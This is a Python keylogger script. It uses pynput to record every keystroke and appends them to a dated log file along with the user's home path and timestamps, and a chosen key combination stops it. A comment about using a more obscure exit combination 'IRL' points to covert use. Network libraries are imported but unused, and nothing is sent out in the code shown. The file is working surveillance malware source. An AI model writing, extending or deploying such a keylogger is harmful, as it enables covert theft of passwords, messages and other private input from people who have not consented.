import pynput
import os
import requests
import socket
import time
import pyautogui
import psutil
from datetime import datetime
from pynput.keyboard import Key, Listener

dateTime = datetime.now()
dateObj = dateTime.date()
timeObj = dateTime.time().isoformat(timespec='minutes')
user = os.path.expanduser('~')
current_file= "log_{}.txt".format(dateObj)

# IRL use a more complicated combination - like up, down, shift, esc, cmd
combination = {Key.cmd, Key.esc}
current = set()     

#Individual key counts
count = 0
keys = []

# Group of key counts
grouping = 0
sets = []

# Run file function once
fileruns = 0
runs = []

def check_file():
    global fileruns, runs
    if os.path.exists("log_{}.txt".format(dateObj)) == False:
        file = open("log_{}.txt".format(dateObj), "w")
        file.write("Program Begin."+f"\n*~Time: {timeObj}"+f"\n*~ User-Profile: {user}"+"\n")
    else:
    #elif os.path.exists("log_{}.txt".format(dateObj)) == True:
        pass

def on_press(key):
    global keys, count, grouping, sets
    check_file()
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

# This will write the letters after 2 key strokes of any key.
# It will also add 1 to the "grouping" counter
# So every 20 key strokes, a time stamp will be inserted
# Since the count resets we need a separate group
    if count >= 2:
        count = 0
        write_file(keys)
        keys = []
        sets.append(key)
        grouping += 1

# Once the grouping counter reaches 10, the program will run the time_stamp function
# This allows for regular time stamps to be inserted into the keylogger
# Because we can't see when someone is afk. You could have two sets of 20 character segments
# With hours between them. This will indicate the person was afk.  
        if grouping >= 10:
            grouping = 0
            time_stamp(sets)
            sets = []

# This introduces a time stamp every x number of groups
def time_stamp(time):
    with open (current_file, "a") as t:
            t.write("{}".format(timeObj))
          
# This is the main function that writes to the file
def write_file(keys):
    with (open(current_file, "a")) as f:
        for key in keys:
            k = str(key).replace("'","") # <-- Program naturally write 'Key.z'. This removes the '
            if k.find("space") > 0: # <-- This replaces 'Key.space' with an actual space for a more natural output
                f.write(" ")
            if key == Key.backspace: # <-- This stops deletions in output and replaces backspace with |
                f.write("|") # <-- This should call a function that takes deleted characters and writes them to another file. See bottom. 
            if key == Key.enter:
                f.write("\n")
            elif k.find("Key") == -1: # <-- Program naturally writes 'Key.z'. This removes Key
                f.write(k)

# This function exits the program. Using combination variable at the top,
# If the keys are pressed in sequential, but ANY order, program exits.
def on_release(key):
    if key in combination:
        current.add(key)
        if all(k in current for k in combination):
            with (open(current_file, "a")) as j:
                j.write("\n")
                j.write("Program end. Date: {} - Time: {}.\n".format(dateObj, timeObj))
                j.write("\n")
            return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

